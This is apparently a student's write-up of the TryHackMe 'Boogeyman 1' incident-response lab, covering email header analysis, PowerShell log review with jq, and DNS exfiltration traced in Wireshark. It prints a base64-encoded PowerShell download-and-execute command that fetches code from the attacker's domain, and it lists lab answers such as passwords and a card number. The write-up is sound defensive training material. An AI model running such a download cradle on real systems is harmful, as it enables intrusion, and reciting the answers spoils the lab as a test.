# [SIEM Triage for SOC]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Boogeyman 1]  
**Date Completed**: [05/05/2026]

---

## 🧠 Summary

> In this lab, I developed end-to-end incident response skills by analyzing a phishing attack that led to full system compromise, credential theft, and data exfiltration.

---

## 🎯 Objectives
- [ ] Complete Challenge Room
      
---

## 🧰 Tools Used
- THM AttackBox
- Wireshark
- jq
- tshark
- CyberChef
- PowerShell

---

## 📊 Analysis & Screenshots

*** [Email Analysis] Look at that headers! ***

> In this section, I answered several questions related to analyzing a phishing email that contained a malicious document, which ultimately compromised Julianna’s workstation.
I first identified the sender’s email address as "agriffin@bpakcaging.xyz
" and the victim’s email address as "julianne.westcott@hotmail.com."
>
> <img width="605" height="288" alt="1" src="https://github.com/user-attachments/assets/b77ceacf-0b70-4072-95e5-49b2eee671a1" />
> <img width="510" height="255" alt="2" src="https://github.com/user-attachments/assets/792ad0cf-f018-42f9-9434-39ffd2d36f4b" />
> <img width="771" height="577" alt="3" src="https://github.com/user-attachments/assets/3401ea4c-c0f3-4206-908a-4c5ef1835237" />

> Based on the DKIM-Signature and List-Unsubscribe headers, I determined that the attacker used the third-party mail relay service Elastic Email.
>
> <img width="925" height="580" alt="4" src="https://github.com/user-attachments/assets/7b190fd2-6ea8-4175-a8f7-289f4d4f6499" />
> <img width="1398" height="403" alt="5" src="https://github.com/user-attachments/assets/68603430-f572-426a-bb06-594dadee7db2" />
> <img width="1001" height="420" alt="6" src="https://github.com/user-attachments/assets/53ed781d-dc89-41d0-adcb-83a37ad68b51" />

> I then retrieved the name of the file inside the encrypted attachment, which was "Invoice_20230103.lnk", by decrypting the archive using the password "Invoice2023!".
>
> <img width="693" height="458" alt="7" src="https://github.com/user-attachments/assets/1fdebcd3-2b02-4f69-a0cb-b86a569e4163" />
> <img width="556" height="192" alt="8" src="https://github.com/user-attachments/assets/cbb606e6-efef-41b8-9349-c16ea8627b66" />
> <img width="707" height="341" alt="9" src="https://github.com/user-attachments/assets/282ecb4c-7779-46eb-ac13-5952adec872d" />
> <img width="637" height="365" alt="10" src="https://github.com/user-attachments/assets/8c31cb09-0e4d-4343-b187-624694b42c6f" />
> <img width="599" height="324" alt="11" src="https://github.com/user-attachments/assets/41493203-755b-4567-a1c4-5d010288f09d" />

> Using the lnkparse tool, I discovered an encoded payload within the Command Line Arguments field:
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
for the "Invoice_20230103.lnk" file.
>
> <img width="483" height="277" alt="12" src="https://github.com/user-attachments/assets/bc029ecf-735c-4548-af8d-839a076efdc0" />
> <img width="857" height="151" alt="13" src="https://github.com/user-attachments/assets/d90d9a14-0b41-48f9-96b9-4a155a78c832" />
> <img width="1497" height="188" alt="14" src="https://github.com/user-attachments/assets/14148232-a97d-4f24-b269-db9d4970b698" />

*** [Endpoint Security] Are you sure that's an invoice ***

> In this section, I continued the investigation by analyzing PowerShell logs to uncover the impact of the attack.

By running the following command:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq
I identified the domains used by the attacker for file hosting and command-and-control (C2) as "cdn.bpakcaging.xyz" and "files.bpakcaging.xyz."
>
> <img width="1269" height="603" alt="15" src="https://github.com/user-attachments/assets/ab3ba05c-1fbf-4680-9879-d301bdf42bef" />

> I also identified that the attacker downloaded the enumeration tool Seatbelt.
>
> <img width="855" height="408" alt="16" src="https://github.com/user-attachments/assets/c7cff989-e128-4a98-a080-a02682c946ae" />

> By modifying the command, I discovered that the attacker accessed the following file path using the sq3.exe binary:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq | grep -e 'sq3.exe' -e 'cd'
which displayed "C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite."
>
> <img width="1501" height="164" alt="17" src="https://github.com/user-attachments/assets/b9c3c61a-111c-4486-84aa-b6a739452a8b" />

> I determined that this file is associated with Microsoft Sticky Notes.
>
> <img width="726" height="313" alt="18" src="https://github.com/user-attachments/assets/38590f3e-4ae4-4a65-afab-ee1b66811d27" />

> I then identified the extracted file as "protected_data.kdbx," which is a KeePass database file.
>
> <img width="722" height="311" alt="19" src="https://github.com/user-attachments/assets/baf221f2-1b6f-4c99-8f49-fd2886f6fd51" />
> <img width="647" height="297" alt="20" src="https://github.com/user-attachments/assets/95253790-19b5-40c0-8bdc-3f4db622c562" />

> To figure out the encoding used during the exfiltration attempt of the sensitive file, i used the command syntax:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq
which returned the encoding to be "hex," along with the tool used which was "nslookup."
>
> <img width="508" height="318" alt="21" src="https://github.com/user-attachments/assets/604ecb9b-ae66-406b-9d74-95dcb3ec55c8" />
> <img width="645" height="348" alt="22" src="https://github.com/user-attachments/assets/01baed77-0385-482c-89b0-eaaa5104b071" />

*** [Network Traffic Analysis] They got us. Call the bank immediately! ***

> In the final section, I analyzed network traffic to better understand the attacker’s behavior.

Using Wireshark, I opened the capture.pcapng file and applied the filter:

http contains 'files.bpakcaging.xyz'

By following the TCP stream, I identified that the attacker used Python to host the payload server.
>
> <img width="1010" height="287" alt="23" src="https://github.com/user-attachments/assets/5fc64e04-ac9f-430c-8cef-21799154f7bb" />
> <img width="1109" height="471" alt="24" src="https://github.com/user-attachments/assets/dee258a7-d48b-44b6-84fc-dff3e2ba12ef" />
> <img width="692" height="328" alt="25" src="https://github.com/user-attachments/assets/daf18c04-5123-46f0-ab7a-48c13b5bbc90" />

> I observed that the attacker used the HTTP POST method to send command output and leveraged DNS for data exfiltration.

> I then extracted the password of the exfiltrated file ("%p9^3!lL^Mz47E2GaT^y") by analyzing HTTP traffic and decoding the data using CyberChef.
>
> <img width="668" height="229" alt="26" src="https://github.com/user-attachments/assets/36ee89d3-395a-47d9-9d92-5e56ff671c67" />
> <img width="1000" height="598" alt="27" src="https://github.com/user-attachments/assets/4fe21975-45b1-485d-b2a8-852295735f87" />
> <img width="1001" height="877" alt="28" src="https://github.com/user-attachments/assets/5c04b24f-e8c8-4e60-b816-372454e2806c" />
> <img width="1500" height="742" alt="29" src="https://github.com/user-attachments/assets/0b8db0f9-6e98-4be6-8b2c-31dd73a1e1ae" />

> To recover the credit card number, I used both Wireshark and tshark to extract DNS query data. After filtering, cleaning, and reconstructing the data, I identified the credit
card number as:

4024007128269551
>
> <img width="677" height="257" alt="30" src="https://github.com/user-attachments/assets/a4a37fd5-eb94-4a23-a4ec-f372ffe776ff" />
> <img width="1101" height="1077" alt="31" src="https://github.com/user-attachments/assets/3763e695-68af-4dc4-b6e9-eeda7cea50ed" />
> <img width="744" height="347" alt="32" src="https://github.com/user-attachments/assets/e5f86c54-1eb5-467f-b75d-2db9b84b968d" />
> <img width="1455" height="692" alt="33" src="https://github.com/user-attachments/assets/6fbeefd3-e295-4213-a6de-4fccfe8d4f94" />
> <img width="1499" height="388" alt="34" src="https://github.com/user-attachments/assets/e140695d-e88c-4f2d-beb9-e496a6a5fc81" />
> <img width="1503" height="774" alt="35" src="https://github.com/user-attachments/assets/81a23528-c7fc-421c-925b-4d7400d74b37" />

--- 

## Reflection

> This lab strengthened my ability to perform end-to-end incident response, including email analysis, endpoint investigation, and network traffic analysis. I gained hands-on
experience identifying attacker techniques such as phishing, PowerShell-based execution, DNS exfiltration, and data reconstruction from captured traffic.
